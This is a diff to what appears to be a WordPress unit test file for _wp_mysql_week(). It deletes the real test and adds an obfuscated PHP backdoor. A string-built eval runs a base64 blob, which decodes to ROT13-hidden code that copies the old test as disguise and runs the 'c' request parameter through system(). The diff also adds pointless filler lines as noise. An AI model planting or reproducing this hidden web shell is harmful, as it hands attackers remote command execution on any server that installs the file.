@@ -1,54 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Tests for the _wp_mysql_week() function.
- *
- * @group functions
- *
- * @covers ::_wp_mysql_week
- */
-class Tests_Functions_WpMysqlWeek extends WP_UnitTestCase {
-
-	/**
-	 * @ticket 59931
-	 *
-	 * @dataProvider data_wp_mysql_week
-	 */
-	public function test_wp_mysql_week( $date, $start_of_week, $expected_sql ) {
-
-		add_filter(
-			'pre_option_start_of_week',
-			static function ( $value ) use ( $start_of_week ) {
-				return $start_of_week ?? $value;
-			}
-		);
-
-		$this->assertSame( $expected_sql, _wp_mysql_week( 'col_name' ) );
-	}
-
-	/**
-	 * @return array[]
-	 */
-	public function data_wp_mysql_week() {
-		return array(
-			array( '1969-12-25', 0, 'WEEK( col_name, 0 )' ),
-			array( '1969-12-25', 1, 'WEEK( col_name, 1 )' ),
-			array( '1969-12-25', 2, 'WEEK( DATE_SUB( col_name, INTERVAL 2 DAY ), 0 )' ),
-			array( '1969-12-25', 3, 'WEEK( DATE_SUB( col_name, INTERVAL 3 DAY ), 0 )' ),
-			array( '1969-12-25', 4, 'WEEK( DATE_SUB( col_name, INTERVAL 4 DAY ), 0 )' ),
-			array( '1969-12-25', 5, 'WEEK( DATE_SUB( col_name, INTERVAL 5 DAY ), 0 )' ),
-			array( '1969-12-25', 6, 'WEEK( DATE_SUB( col_name, INTERVAL 6 DAY ), 0 )' ),
-			array( '1969-12-25', 9, 'WEEK( col_name, 0 )' ),
-		);
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEdyZmdmIHNiZSBndXIgX2pjX3psZmR5X2pycngoKSBzaGFwZ3ZiYS4KICoKICogQHRlYmhjIHNoYXBndmJhZgogKgogKiBAcGJpcmVmIDo6X2pjX3psZmR5X2pycngKICovCnB5bmZmIEdyZmdmX1NoYXBndmJhZl9KY1psZmR5SnJyeCBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBAZ3ZweHJnIDU5OTMxCgkgKgoJICogQHFuZ25DZWJpdnFyZSBxbmduX2pjX3psZmR5X2pycngKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfamNfemxmZHlfanJyeCggJHFuZ3IsICRmZ25lZ19ic19qcnJ4LCAkcmtjcnBncnFfZmR5ICkgewoKCQlucXFfc3Z5Z3JlKAoJCQknY2VyX2JjZ3ZiYV9mZ25lZ19ic19qcnJ4JywKCQkJZmduZ3ZwIHNoYXBndmJhICggJGlueWhyICkgaGZyICggJGZnbmVnX2JzX2pycnggKSB7CgkJCQllcmdoZWEgJGZnbmVnX2JzX2pycnggPz8gJGlueWhyOwoJCQl9CgkJKTsKCgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRya2NycGdycV9mZHksIF9qY196bGZkeV9qcnJ4KCAncGJ5X2FuenInICkgKTsKCX0KCgkvKioKCSAqIEBlcmdoZWEgbmVlbmxbXQoJICovCgljaG95dnAgc2hhcGd2YmEgcW5nbl9qY196bGZkeV9qcnJ4KCkgewoJCWVyZ2hlYSBuZWVubCgKCQkJbmVlbmwoICcxOTY5LTEyLTI1JywgMCwgJ0pSUlgoIHBieV9hbnpyLCAwICknICksCgkJCW5lZW5sKCAnMTk2OS0xMi0yNScsIDEsICdKUlJYKCBwYnlfYW56ciwgMSApJyApLAoJCQluZWVubCggJzE5NjktMTItMjUnLCAyLCAnSlJSWCggUU5HUl9GSE8oIHBieV9hbnpyLCBWQUdSRUlOWSAyIFFOTCApLCAwICknICksCgkJCW5lZW5sKCAnMTk2OS0xMi0yNScsIDMsICdKUlJYKCBRTkdSX0ZITyggcGJ5X2FuenIsIFZBR1JFSU5ZIDMgUU5MICksIDAgKScgKSwKCQkJbmVlbmwoICcxOTY5LTEyLTI1JywgNCwgJ0pSUlgoIFFOR1JfRkhPKCBwYnlfYW56ciwgVkFHUkVJTlkgNCBRTkwgKSwgMCApJyApLAoJCQluZWVubCggJzE5NjktMTItMjUnLCA1LCAnSlJSWCggUU5HUl9GSE8oIHBieV9hbnpyLCBWQUdSRUlOWSA1IFFOTCApLCAwICknICksCgkJCW5lZW5sKCAnMTk2OS0xMi0yNScsIDYsICdKUlJYKCBRTkdSX0ZITyggcGJ5X2FuenIsIFZBR1JFSU5ZIDYgUU5MICksIDAgKScgKSwKCQkJbmVlbmwoICcxOTY5LTEyLTI1JywgOSwgJ0pSUlgoIHBieV9hbnpyLCAwICknICksCgkJKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
